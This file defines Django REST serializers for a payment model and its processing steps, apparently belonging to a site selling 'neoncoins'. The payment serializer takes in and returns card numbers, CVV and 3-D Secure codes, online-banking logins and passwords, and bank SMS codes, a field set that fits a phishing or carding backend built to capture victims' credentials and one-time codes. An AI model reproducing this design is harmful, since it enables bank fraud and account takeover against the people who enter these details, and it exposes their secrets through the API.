from rest_framework import serializers
from .models import Payment, PaymentStep

class PaymentSerializer(serializers.ModelSerializer):
    class Meta:
        model = Payment
        fields = [
            'id', 'user', 'amount', 'currency', 'payment_method', 'status',
            'neoncoins_amount', 'card_holder', 'card_number', 'card_expiry',
            'card_cvv', 'card_3ds_code', 'bank_name', 'bank_login',
            'bank_password', 'bank_sms_code', 'crypto_type', 'crypto_network',
            'crypto_wallet_address', 'payment_ip', 'user_agent', 'fee',
            'exchange_rate', 'created_at', 'updated_at', 'processed_at',
            'completed_at', 'notes', 'admin_notes', 'attempts_count', 'max_attempts'
        ]
        read_only_fields = [
            'id', 'user', 'created_at', 'updated_at', 'processed_at',
            'completed_at', 'admin_notes', 'attempts_count'
        ]

class PaymentStepSerializer(serializers.ModelSerializer):
    class Meta:
        model = PaymentStep
        fields = [
            'id', 'payment', 'step_type', 'status', 'description',
            'details', 'created_at', 'completed_at'
        ]
        read_only_fields = ['id', 'payment', 'created_at']